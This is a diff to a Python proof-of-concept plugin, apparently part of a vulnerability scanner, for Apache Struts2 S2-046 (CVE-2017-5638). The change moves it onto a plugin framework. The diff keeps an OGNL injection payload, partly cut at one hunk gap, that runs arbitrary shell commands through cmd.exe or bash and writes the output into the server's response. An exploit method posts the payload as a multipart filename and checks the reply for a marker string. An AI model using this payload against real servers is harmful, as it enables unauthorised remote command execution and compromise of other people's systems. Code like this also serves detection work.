@@ -3,19 +3,17 @@
 
 __author__ = 'xiaokong'
 
-import sys
-import requests
-from module.log import logger
+from module.plugin import Plugin
 
-
-
-class poc(object):
+class poc(Plugin):
 
     type = 'FRAME'
+    name = 'strust'
     querytype = 'site'
     description = 'Struts2-046 remote command execute(CVE-2017-5638)'
+
     
-    def __init__(self, v):
+    def __init__(self):
         
         self.payload="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):\
                 ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony\
@@ -24,22 +22,15 @@ class poc(object):
                 contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).\
                 (#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream\
                 ())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
-        self.logger = logger(v)
-        self.userAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'
         
     def exploit(self, target):
         
-        headers = {'User-Agent': self.userAgent}
-        try:
             f= {'file':(self.payload, open("data/tmp.txt", 'r'), 'text/plain')}
-            res = requests.post(target, files=f, headers=headers, timeout=30)
-            if not res.ok:
-                return True
-            data = res.content
-            if '13923fd34fcv4200' in data and "context.setMemberAccess" not in data:
-                self.logger.log(41,str([target]))
-        except Exception as e:
-            self.logger.debug(str(e))
+            response =self.query(method='POST', url=target, files=f)
+            if response:
+                if response.ok:
+                    if '13923fd34fcv4200' in response.content and "context.setMemberAccess" not in response.content:
+                        self.log.vuln(target)
         
         
     
